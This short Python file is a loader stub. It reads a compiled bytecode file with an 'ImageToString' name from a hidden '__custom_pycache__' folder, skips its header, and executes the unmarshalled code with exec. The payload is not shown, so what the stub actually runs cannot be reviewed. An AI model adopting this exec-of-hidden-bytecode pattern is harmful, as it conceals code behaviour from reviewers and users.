
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToString_c37ceaa044d64556aa02211bc1636f5e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
